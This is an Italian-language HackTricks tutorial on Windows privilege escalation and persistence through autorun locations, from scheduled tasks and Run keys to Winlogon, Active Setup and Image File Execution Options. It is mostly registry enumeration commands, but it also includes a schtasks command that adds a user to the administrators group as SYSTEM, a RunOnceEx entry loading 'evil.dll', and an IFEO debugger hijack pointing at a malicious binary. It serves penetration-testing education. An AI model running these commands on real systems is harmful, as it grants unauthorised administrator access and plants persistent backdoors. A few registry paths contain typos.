# Escalazione dei privilegi con Autoruns

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se sei interessato a una **carriera nell'hacking** e vuoi hackerare l'impossibile - **stiamo assumendo!** (_richiesta competenza fluente in polacco, scritta e parlata_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** può essere utilizzato per eseguire programmi all'avvio. Per vedere quali binari sono programmati per l'avvio, utilizzare:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Attività pianificate

Le **attività** possono essere programmate per essere eseguite con una **certa frequenza**. Verifica quali binari sono programmati per essere eseguiti con:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Cartelle

Tutti i binari situati nelle **cartelle di avvio verranno eseguiti all'avvio**. Le cartelle di avvio comuni sono elencate di seguito, ma la cartella di avvio è indicata nel registro. [Leggi questo per scoprire dove.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registro

{% hint style="info" %}
[Nota da qui](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): L'ingresso del registro **Wow6432Node** indica che si sta eseguendo una versione di Windows a 64 bit. Il sistema operativo utilizza questa chiave per visualizzare una vista separata di HKEY\_LOCAL\_MACHINE\SOFTWARE per le applicazioni a 32 bit che vengono eseguite su versioni di Windows a 64 bit.
{% endhint %}

### Esecuzioni

Registro di AutoRun comunemente noto:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Le chiavi di registro conosciute come **Run** e **RunOnce** sono progettate per eseguire automaticamente programmi ogni volta che un utente accede al sistema. La riga di comando assegnata come valore dei dati di una chiave è limitata a 260 caratteri o meno.

**Esecuzioni di servizi** (possono controllare l'avvio automatico dei servizi durante l'avvio):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Su Windows Vista e versioni successive, le chiavi di registro **Run** e **RunOnce** non vengono generate automaticamente. Le voci in queste chiavi possono avviare direttamente programmi o specificarli come dipendenze. Ad esempio, per caricare un file DLL all'avvio, si potrebbe utilizzare la chiave di registro **RunOnceEx** insieme a una chiave "Depend". Questo viene dimostrato aggiungendo una voce di registro per eseguire "C:\\temp\\evil.dll" durante l'avvio del sistema:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: Se puoi scrivere all'interno di uno dei registri menzionati all'interno di **HKLM**, puoi elevare i privilegi quando un utente diverso effettua il login.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Se puoi sovrascrivere uno dei binari indicati in uno dei registri all'interno di **HKLM**, puoi modificare quel binario con un backdoor quando un utente diverso effettua il login ed elevare i privilegi.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Percorso di avvio

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

I collegamenti posti nella cartella **Avvio** avvieranno automaticamente servizi o applicazioni durante l'accesso dell'utente o il riavvio del sistema. La posizione della cartella **Avvio** è definita nel registro sia per il **Local Machine** che per l'**Current User**. Ciò significa che qualsiasi collegamento aggiunto a queste posizioni specificate della cartella **Avvio** garantirà che il servizio o il programma collegato si avvii dopo il processo di accesso o riavvio, rendendolo un metodo semplice per pianificare l'esecuzione automatica di programmi.

{% hint style="info" %}
Se è possibile sovrascrivere una qualsiasi \[User] Shell Folder sotto **HKLM**, sarà possibile indirizzarla verso una cartella controllata da te e posizionare un backdoor che verrà eseguito ogni volta che un utente accede al sistema, ottenendo privilegi elevati.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Chiavi di Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Di solito, la chiave **Userinit** è impostata su **userinit.exe**. Tuttavia, se questa chiave viene modificata, l'eseguibile specificato verrà lanciato anche da **Winlogon** all'avvio dell'utente. Allo stesso modo, la chiave **Shell** è destinata a puntare a **explorer.exe**, che è la shell predefinita per Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Se riesci a sovrascrivere il valore del registro o il file binario, sarai in grado di ottenere privilegi elevati.
{% endhint %}

### Impostazioni di policy

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Controlla la chiave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Modifica del prompt dei comandi della modalità provvisoria

Nel Registro di sistema di Windows, sotto `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, è presente un valore chiamato **`AlternateShell`** impostato di default su `cmd.exe`. Ciò significa che quando si sceglie "Modalità provvisoria con prompt dei comandi" durante l'avvio (premendo F8), viene utilizzato `cmd.exe`. Tuttavia, è possibile configurare il computer per avviarsi automaticamente in questa modalità senza dover premere F8 e selezionarla manualmente.

Ecco i passaggi per creare un'opzione di avvio per l'avvio automatico in "Modalità provvisoria con prompt dei comandi":

1. Modificare gli attributi del file `boot.ini` per rimuovere i flag di sola lettura, sistema e nascosto: `attrib c:\boot.ini -r -s -h`
2. Aprire `boot.ini` per la modifica.
3. Inserire una riga come questa: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Salvare le modifiche a `boot.ini`.
5. Ripristinare gli attributi originali del file: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** La modifica della chiave di registro **AlternateShell** consente la configurazione di un prompt dei comandi personalizzato, potenzialmente per l'accesso non autorizzato.
- **Exploit 2 (Permessi di scrittura su PATH):** Avere i permessi di scrittura su qualsiasi parte della variabile di sistema **PATH**, specialmente prima di `C:\Windows\system32`, consente di eseguire un `cmd.exe` personalizzato, che potrebbe essere una backdoor se il sistema viene avviato in modalità provvisoria.
- **Exploit 3 (Permessi di scrittura su PATH e boot.ini):** L'accesso in scrittura a `boot.ini` consente l'avvio automatico in modalità provvisoria, facilitando l'accesso non autorizzato al successivo riavvio.

Per verificare l'impostazione corrente di **AlternateShell**, utilizzare questi comandi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Componente installato

Active Setup è una funzionalità di Windows che si avvia prima che l'ambiente desktop sia completamente caricato. Prioritizza l'esecuzione di determinati comandi, che devono essere completati prima che prosegua l'accesso dell'utente. Questo processo avviene anche prima di altre voci di avvio, come quelle nelle sezioni del registro di sistema Run o RunOnce.

Active Setup è gestito attraverso le seguenti chiavi di registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

All'interno di queste chiavi, esistono diverse sottochiavi, ognuna corrispondente a un componente specifico. I valori chiave di particolare interesse includono:

- **IsInstalled:**
- `0` indica che il comando del componente non verrà eseguito.
- `1` significa che il comando verrà eseguito una volta per ogni utente, che è il comportamento predefinito se il valore `IsInstalled` è assente.
- **StubPath:** Definisce il comando da eseguire tramite Active Setup. Può essere qualsiasi comando valido da riga di comando, come ad esempio l'avvio di `notepad`.

**Considerazioni sulla sicurezza:**

- Modificare o scrivere una chiave in cui **`IsInstalled`** è impostato su `"1"` con un determinato **`StubPath`** può portare all'esecuzione non autorizzata di comandi, potenzialmente per l'elevazione dei privilegi.
- Modificare il file binario a cui fa riferimento qualsiasi valore **`StubPath`** potrebbe anche consentire l'elevazione dei privilegi, a condizione di disporre delle autorizzazioni necessarie.

Per ispezionare le configurazioni **`StubPath`** dei componenti Active Setup, è possibile utilizzare questi comandi:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Oggetti Helper del Browser

### Panoramica degli Oggetti Helper del Browser (BHO)

Gli Oggetti Helper del Browser (BHO) sono moduli DLL che aggiungono funzionalità extra a Internet Explorer di Microsoft. Vengono caricati in Internet Explorer e Windows Explorer ad ogni avvio. Tuttavia, la loro esecuzione può essere bloccata impostando la chiave **NoExplorer** su 1, impedendo loro di caricarsi con le istanze di Windows Explorer.

I BHO sono compatibili con Windows 10 tramite Internet Explorer 11, ma non sono supportati in Microsoft Edge, il browser predefinito nelle versioni più recenti di Windows.

Per esplorare i BHO registrati su un sistema, è possibile ispezionare le seguenti chiavi di registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Ogni BHO è rappresentato dal suo **CLSID** nel registro, che funge da identificatore univoco. Informazioni dettagliate su ciascun CLSID possono essere trovate in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Per interrogare i BHO nel registro, è possibile utilizzare i seguenti comandi:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Estensioni di Internet Explorer

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Si noti che il registro conterrà 1 nuovo registro per ogni dll e sarà rappresentato dal **CLSID**. È possibile trovare le informazioni del CLSID in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Driver dei caratteri

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Comando di Apertura

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opzioni di esecuzione dei file immagine

Le opzioni di esecuzione dei file immagine sono un meccanismo di Windows che consente di specificare un eseguibile da avviare ogni volta che un determinato file eseguibile viene avviato. Questo meccanismo può essere sfruttato per ottenere l'escalation dei privilegi locali.

#### Creazione di una chiave di registro

Per creare una chiave di registro per un eseguibile specifico, è possibile utilizzare il comando `reg add` come segue:

```plaintext
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\executable.exe" /v Debugger /t REG_SZ /d "C:\path\to\malicious\binary.exe" /f
```

Dove `executable.exe` è il nome dell'eseguibile di destinazione e `C:\path\to\malicious\binary.exe` è il percorso dell'eseguibile malevolo che si desidera eseguire.

#### Impatto

Quando l'eseguibile di destinazione viene avviato, verrà invece avviato l'eseguibile malevolo specificato nella chiave di registro. Ciò può consentire all'attaccante di eseguire codice con privilegi elevati.

#### Rimozione della chiave di registro

Per rimuovere la chiave di registro creata, è possibile utilizzare il comando `reg delete` come segue:

```plaintext
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\executable.exe" /f
```

Dove `executable.exe` è il nome dell'eseguibile di destinazione.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Si noti che tutti i siti in cui è possibile trovare autoruns sono già stati cercati da [winpeas.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Tuttavia, per una lista più completa dei file auto-eseguiti, è possibile utilizzare [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) di SysInternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Altro

**Trova altre voci di Autorun come registri in [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## Riferimenti

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se sei interessato a una **carriera di hacking** e a violare l'invulnerabile - **stiamo assumendo!** (_richiesta competenza fluente in polacco, scritta e parlata_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
